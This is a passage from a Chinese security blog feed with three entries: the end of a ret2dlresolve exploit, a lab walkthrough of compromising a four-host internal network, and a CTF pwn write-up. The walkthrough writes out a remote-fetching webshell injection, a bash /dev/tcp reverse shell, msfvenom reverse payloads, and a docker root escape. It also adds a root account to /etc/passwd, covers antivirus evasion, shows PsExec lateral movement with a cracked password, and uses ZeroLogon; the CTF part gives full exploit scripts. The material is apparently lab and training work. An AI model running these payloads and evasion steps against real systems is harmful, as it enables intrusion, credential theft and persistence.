link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    link_map += flat(fake_linkmap_addr,                 <span class="comment"># DT_STRTAB</span></span><br><span class="line">                     fake_linkmap_addr + <span class="number">0x38</span>,          <span class="comment"># DT_SYMTAB</span></span><br><span class="line">                     )</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    link_map += flat(fake_linkmap_addr + <span class="number">0x8</span>)           <span class="comment"># DT_JMPREL</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> link_map</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">pld += flat(p_rdi_r, <span class="number">0</span>, p_rsi_r15_r, bss, <span class="number">0</span>, read_plt, ret,</span><br><span class="line">            p_rdi_r, bss + <span class="number">0x48</span>, plt_jump_dl, bss, <span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(fake_linkmap_x64(bss, write_got, libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>在该情况下，整个got表都只读，got表中的link_map和dl_runtime_resolve函数的地址都将是0，故而不能直接进行ret2dlresolve。不过如果能够找到输出函数或者是某段汇编泄露上述两者的地址的话，那还是有可能成功的。</p>
<blockquote>
<p>参考资料：</p>
<p><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO | T3stzer0’s Blog (testzero-wz.com)</a></p>
<p><a href="https://blog.e4l4.com/posts/id=13/">ret2dl利用总结 | E4L4</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Ret2dl-resolve</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透高度安全的内网</title>
    <url>/2023/07/27/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AB/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学习的是暗月项目八：高度安全的内网域渗透。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729182411683.png" alt="image-20230729182411683"></p>
<ul>
<li>外网WEB服务器：学习了PbootCMS的后台漏洞、绕过宝塔的禁止函数和本地docker提权。</li>
<li>内网WEB服务器：学习了JSPXCMS的后台zip解压目录穿越漏洞，上传免杀的恶意war包拿到shell，利用X-AV免杀工具绕过了更新后的360全家桶和defender，通过端口转发绕过防火墙实现远程桌面登录。</li>
<li>文件服务器：尝试利用msf和cs进行内网穿透实现反向连接，以及利用Psexec进行pth攻击。</li>
<li>AD域控：学习了ZeroLogon的利用获取域控权限。</li>
</ul>
<p>最终也是跟着暗月佬拿下了这四台主机。</p>
<span id="more"></span>

<h2 id="外网WEB服务器"><a href="#外网WEB服务器" class="headerlink" title="外网WEB服务器"></a>外网WEB服务器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -i eth0 -r 192.168.215.0/24</span><br><span class="line">sudo masscan -p 0-65535 192.168.215.140 --rate=500</span><br><span class="line"></span><br><span class="line">nmap -sC -A -p 8888,3306,80,22,21,888 192.168.215.140</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726142251679.png" alt="image-20230726142251679"></p>
<p>可以看到<code>BT Panel</code>，是宝塔面板搭建的而且默认是打开了安全入口，所以找不到面板的登陆网址。那么看看网站有没有漏洞，首先绑定hosts为<code>www.cf1.com</code>，访问发现是PbootCMS，直接官网下载源码分析，发现在<code>/doc/ChangeLog.txt</code>有版本的更新日志，访问目标网站找到目前版本为<code>2.0.8</code>。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726143551046.png" alt="image-20230726143551046"></p>
<p>尝试了2.x版本的cms漏洞，均以失败告终，只找到一篇后台RCE。接下来尝试从数据库作为突破口，找到数据库配置文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主数据库连接参数，未配置的参数使用框架惯性配置</span></span><br><span class="line"><span class="comment"> * 如果修改为mysql数据库，请同时修改type和dbname两个参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;database&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;sqlite&#x27;</span>, <span class="comment">// 数据库连接驱动类型: mysqli,sqlite,pdo_mysql,pdo_sqlite</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 数据库服务器</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;pboot&#x27;</span>, <span class="comment">// 数据库连接用户名</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// 数据库连接密码</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>, <span class="comment">// 数据库端口</span></span><br><span class="line">                          </span><br><span class="line">        <span class="comment">// &#x27;dbname&#x27; =&gt; &#x27;pbootcms&#x27; // 去掉注释，启用mysql数据库，注意修改前面的连接信息及type为mysqli</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;/data/pbootcms.db&#x27;</span> <span class="comment">// 去掉注释，启用Sqlite数据库，注意修改type为sqlite</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>尝试下载数据库文件<code>/data/pbootcms.db</code>失败，看了视频才发现在网站搭建的过程中会修改数据库的名字为随机数。网上搜索了一下，发现可以直接访问静态文件，或者是备份文件<code>.swp</code>（vim修改之后的文件）。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726152816510.png" alt="image-20230726152816510"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726153006590.png" alt="image-20230726153006590"></p>
<p>somd5破解得到密码admin7788。进入后台利用上面找到的RCE，成功执行。</p>
<blockquote>
<p><a href="https://www.freebuf.com/articles/web/253403.html">从PbootCMS审计到某狗绕过 - FreeBuf网络安全行业门户</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155120334.png" alt="image-20230726155120334"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155134604.png" alt="image-20230726155134604"></p>
<p>但是需要注意，宝塔面板是禁止系统函数的调用的，可以从phpinfo中找到，如下图所示：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726181242143.png" alt="image-20230726181242143"></p>
<p>接下来尝试将webshell读入目标服务器中。一开始是利用file_put_contents函数尝试直接写入一句话木马，但是发现失败了，应该是过滤字符的原因，所以联合了file_get_contents远程读文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>((<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;put_&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>])((<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>])),(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">&#x27;</span>,<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;put_&#x27;</span>,<span class="string">&#x27;contents(&#x27;</span>,<span class="string">&#x27;&quot;shell&#x27;</span>,<span class="string">&#x27;.php&quot;,&#x27;</span>,<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;get_&#x27;</span>,<span class="string">&#x27;contents(&#x27;</span>,<span class="string">&#x27;&quot;http://192.168.215.133:8080/shell.php&quot;));&#x27;</span>])))))&#125;!!!&#123;/pboot:<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来就是绕过宝塔的disable_functions，找到项目：</p>
<blockquote>
<p><a href="https://github.com/mm0r1/exploits/">mm0r1&#x2F;exploits: Pwn stuff. (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726192826399.png" alt="image-20230726192826399"></p>
<p>直接利用bash反弹shell，修改脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.215.133/5555 0&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>接下来就是思考如何提权了，尝试了内核提权和suid提权，最终都以失败告终。找到用户cf1的目录，发现私钥和公钥都有可以读写的权限，直接拿到私钥ssh。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa cf1@192.168.215.140</span><br></pre></td></tr></table></figure>

<p>id发现加入了docker组，那么可以尝试docker提权。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726202445029.png" alt="image-20230726202445029"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br></pre></td></tr></table></figure>

<p>为了维持权限，向&#x2F;etc&#x2F;passwd中加入root用户。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 --salt pursue 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pursue:$1$pursue<span class="variable">$Q</span>/oVnrEm49MGZX3Z9qFSy1:0:0:root:/root:/bin/bash</span></span><br></pre></td></tr></table></figure>



<h2 id="内网WEB服务器"><a href="#内网WEB服务器" class="headerlink" title="内网WEB服务器"></a>内网WEB服务器</h2><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728112553789.png" alt="image-20230728112553789"></p>
<p>访问8080端口，发现是<code>JSPXCMS</code>，找到后台地址尝试弱口令，成功进入后台。发现文件管理的功能，尝试上传jsp文件拿shell，但是尝试后发现在所管理目录下是无权限访问jsp文件的，随后网上找到一篇jspxcms后台利用文件。</p>
<blockquote>
<p><a href="https://blog.csdn.net/lastwinn/article/details/119303905">(17条消息) jspxcms_jspxcms漏洞_angelkat的博客-CSDN博客</a></p>
</blockquote>
<p>Kali中自带了恶意的war包，路径为<code>/usr/share/laudanum/jsp/cmd.war</code>，尝试上传但是被查杀了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728131053288.png" alt="image-20230728131053288"></p>
<p>需要免杀，没有找到适合的项目，直接拿暗月佬推荐的项目，上传成功免杀360全家桶：</p>
<blockquote>
<p><a href="https://github.com/SecurityRiskAdvisors/cmd.jsp">SecurityRiskAdvisors&#x2F;cmd.jsp：一个具有文件上传功能的超小型jsp webshell。 (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728133957871.png" alt="image-20230728133957871"></p>
<p>根据项目readme的介绍，我们可以起一个服务器来加载js文件，同时修改js文件中cmd.jsp的访问路径。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.215.141/cmdjsp/a.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="string">&quot;&lt;form method=post action=&#x27;http://192.168.215.139:8080/cmd/cmd.jsp&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input name=&#x27;c&#x27; type=text&gt;&lt;input type=submit value=&#x27;Run&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;/form&gt;&lt;hr&gt;\</span></span><br><span class="line"><span class="string">&lt;form action=&#x27;http://192.168.215.139:8080/cmd/cmd.jsp&#x27; method=post&gt;\</span></span><br><span class="line"><span class="string">Upload dir: &lt;input name=&#x27;a&#x27; type=text value=&#x27;.&#x27;&gt;&lt;br&gt;\</span></span><br><span class="line"><span class="string">Select a file to upload: &lt;input name=&#x27;n&#x27; type=&#x27;file&#x27; id=&#x27;f&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input type=&#x27;hidden&#x27; name=&#x27;b&#x27; id=&#x27;b&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;/form&gt;&lt;hr&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728135930568.png" alt="image-20230728135930568"></p>
<p>接下来尝试反弹一个shell，由于正常的webshell都会被查杀，尝试用matesploit过360和defender，似乎会被360杀？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.215.133 lport=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.215.133</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 3333</span><br><span class="line">msf6 exploit(multi/handler) &gt; set shell cmd.exe</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p>由于没有meterpreter，使用起来不是很方便而且会断开连接，所以尝试上线CS。</p>
<p>由于能上外网，所以360和defender都做了自动的更新，使得免杀的难度大大提高。尝试了很多款免杀的工具，大部分基本上能够绕过360，但是绕不过defender，这么看来还是defender更为强大，最终找到一款工具能够绕过defender。</p>
<blockquote>
<p><a href="https://redn3ck.github.io/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/">CS免杀 - bypass defender | redn3ck’s blog</a></p>
<p><a href="https://github.com/XTeam-Wing/X-AV">XTeam-Wing&#x2F;X-AV: X系列安全工具-AV免杀框架-BypassAV (github.com)</a></p>
</blockquote>
<p>改工具测试下来，三种加密手段其中XOR和RC4会被360行为检测，不过多次执行能够绕过，应该是360检测存在一定的疏忽；而AES加密方法不会被360动态监测到。<strong>但是需要注意的是，要及时做进程的迁移，否则还是会被defender杀</strong>，最后成功上线。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729131104918.png" alt="image-20230729131104918"></p>
<p>收集hash，尝试破解管理员密码，得到密码为QWEasd123。接下来探测内网，端口扫描，发现主机。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729132438710.png" alt="image-20230729132438710"></p>
<p>发现存在一台内网的主机名FILESERVER，并且存在域为FBI，开放5985和445端口。尝试访问共享目录，用主机名失败用IP成功。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729133252483.png" alt="image-20230729133252483"></p>
<p>尝试使用psexec进行横向移动，应该是执行成功了，但是没有成功返回。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729134004783.png" alt="image-20230729134004783"></p>
<p>由于msf的功能更为强大，所以拿一个msf的shell，尝试用掩日去加载shellcode，发现会被杀，而用上述的工具制作木马不会被杀。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.215.133 lport=7777 -f raw -o msf.bin</span><br></pre></td></tr></table></figure>

<p>想要远程登录主机，需要开启3389端口，并且因为有防火墙的原因，需要做一个端口转发，把内网3389转发到Kali的3389端口上。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.215.133</span><br></pre></td></tr></table></figure>



<h2 id="文件服务器"><a href="#文件服务器" class="headerlink" title="文件服务器"></a>文件服务器</h2><p>由于可能存在防火墙，所以需要做一个内网穿透来反向连接服务器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.1.129 lport=7788 -f raw -o msf2.bin</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell copy C:\Windows\Temp\aes2.exe \\10.10.1.128\c$</span></span><br></pre></td></tr></table></figure>

<p>还需要在内网WEB服务器上做一个转发，<strong>注意需要关闭360安全卫士，否则会拦截</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh interface portproxy add v4tov4 listenport=7788 connectaddress=192.168.215.133 connectport=7788</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh interface portproxy show all</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh advfirewall firewall add rule name=<span class="string">&quot;7788&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=7788 action=allow</span></span><br></pre></td></tr></table></figure>

<p>最好在拿到的远程桌面中执行，因为psexec需要点击一个agree。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PsExec.exe \\10.10.1.128 -u administrator -p QWEasd123 -i c:\aes2.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729151224928.png" alt="image-20230729151224928"></p>
<p>接下来尝试上线CS，需要使用到转发上线的功能，创建一个新的监听器，开放一下端口，生成载荷上传执行即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh advfirewall firewall add rule name=<span class="string">&quot;1234&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=1234 action=allow</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729155126846.png" alt="image-20230729155126846"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160123494.png" alt="image-20230729160123494"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160133670.png" alt="image-20230729160133670"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160230558.png" alt="image-20230729160230558"></p>
<h2 id="AD域控"><a href="#AD域控" class="headerlink" title="AD域控"></a>AD域控</h2><p>msf开启路由和代理开始扫端口。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729162608625.png" alt="image-20230729162608625"></p>
<p>尝试ZeroLogon (CVE-2020-1472)，适用条件就是能够定位域控主机名及IP，并且可以访问域控。</p>
<blockquote>
<p><a href="https://blog.csdn.net/Captain_RB/article/details/120643838">(18条消息) ZeroLogon (CVE-2020-1472) 漏洞利用_zerologon漏洞_Captain_RB的博客-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1727748">ZeroLogon(CVE-2020-1472) 分析与狩猎-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</blockquote>
<p>工具地址：</p>
<blockquote>
<p><a href="https://github.com/SecuraBV/CVE-2020-1472">SecuraBV&#x2F;CVE-2020-1472: Test tool for CVE-2020-1472 (github.com)</a></p>
<p><a href="https://github.com/dirkjanm/CVE-2020-1472">dirkjanm&#x2F;CVE-2020-1472: PoC for Zerologon - all research credits go to Tom Tervoort of Secura (github.com)</a></p>
<p><a href="https://github.com/fortra/impacket">fortra&#x2F;impacket：Impacket是用于处理网络协议的Python类的集合。 (github.com)</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729164630423.png" alt="image-20230729164630423"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729165026682.png" alt="image-20230729165026682"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170352849.png" alt="image-20230729170352849"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170619970.png" alt="image-20230729170619970"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 巅峰极客</title>
    <url>/2023/07/23/CTF/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h3><p>一眼题目以为是ret2dlresolve，看了保护发现开了<code>Full RELRO</code>，直接自闭，看了Ex师傅的脚本才发现一段神奇的汇编，可以把got中的地址写到bss上，然后我是把read的got写到bss上，然后改成<code>syscall</code>的地址，最后调用execve。我后来想了想，硬要说这个汇编是怎么找到的，一来IDA中bss上有地址量<code>unk_601020</code>的显示，交叉引用能够找到，二来就是凭借经验了。</p>
<span id="more"></span>

<p>EXP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x00000000004007e3</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x00000000004007e1</span></span><br><span class="line">p_rbp_r = <span class="number">0x0000000000400570</span></span><br><span class="line">leave_ret = <span class="number">0x000000000400772</span></span><br><span class="line">magic = <span class="number">0x000000000040066b</span>          <span class="comment"># lea rdx,[rax+0x601020];mov rax,[rbp-8];mov [rdx],rax;nop;pop rbp;ret</span></span><br><span class="line"></span><br><span class="line">pld = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>,</span><br><span class="line">    p_rbp_r, elf.got[<span class="string">&#x27;read&#x27;</span>] + <span class="number">8</span>,</span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0x601020</span>, <span class="number">0</span>,</span><br><span class="line">    elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    magic, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0x601020</span> + <span class="number">0x100</span> - <span class="number">58</span>, <span class="number">0</span>,</span><br><span class="line">    elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    p_rdi_r, <span class="number">0x601020</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    p_rbp_r, <span class="number">0x601020</span> + <span class="number">0x100</span> - <span class="number">8</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">    )</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">58</span> + <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h3><p>发现除了add的功能其他的都不能用，找到整数溢出。利用这个漏洞我们可以在libc上写一个堆块地址，然后向这个堆块写入0x68的内容。在<code>main_arena.fastbinsY[5]</code>，也就是堆块大小为0x70的地方构造堆块，即可实现任意地址分配堆块。同时，发现程序没开PIE以及data段上有打印的信息，可以通过任意地址堆块分配修改打印的信息，使得输出libc地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000401</span>A76                               ; <span class="number">16</span>:   dword_4042C8 = read_number();</span><br><span class="line">.text:<span class="number">0000000000401</span>A76 B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A7B E8 <span class="number">49</span> FB FF FF                call    read_number</span><br><span class="line">.text:<span class="number">0000000000401</span>A7B</span><br><span class="line">.text:<span class="number">0000000000401</span>A80 <span class="number">89</span> <span class="number">05</span> <span class="number">42</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span>             mov     cs:dword_4042C8, eax</span><br><span class="line">.text:<span class="number">0000000000401</span>A86                               ; <span class="number">17</span>:   qword_4042C0 = <span class="built_in">malloc</span>(<span class="number">8</span> * dword_4042C8);</span><br><span class="line">.text:<span class="number">0000000000401</span>A86 <span class="number">8B</span> <span class="number">05</span> <span class="number">3</span>C <span class="number">28</span> <span class="number">00</span> <span class="number">00</span>             mov     eax, cs:dword_4042C8</span><br><span class="line">.text:<span class="number">0000000000401</span>A8C C1 E0 <span class="number">03</span>                      shl     eax, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000401</span>A8F <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">0000000000401</span>A91 <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax              ; size</span><br><span class="line">.text:<span class="number">0000000000401</span>A94 E8 <span class="number">77</span> F7 FF FF                call    _malloc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data:<span class="number">0000000000404260</span> <span class="number">20</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_404260 dq offset a1AddNote</span><br><span class="line">.data:<span class="number">0000000000404260</span>                                                             ; DATA XREF: sub_401704+<span class="number">3</span>D↑o</span><br><span class="line">.data:<span class="number">0000000000404260</span>                                                             ; <span class="string">&quot;1. Add Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404268</span> <span class="number">30</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a2ShowNote          ; <span class="string">&quot;2. Show Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404270</span> <span class="number">40</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a3DeleteNote        ; <span class="string">&quot;3. Delete Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404278</span> <span class="number">50</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a4EditNote          ; <span class="string">&quot;4. Edit Note&quot;</span></span><br></pre></td></tr></table></figure>

<p>采用的是house_of_apple2的方法完成的orw，脚本如下：</p>
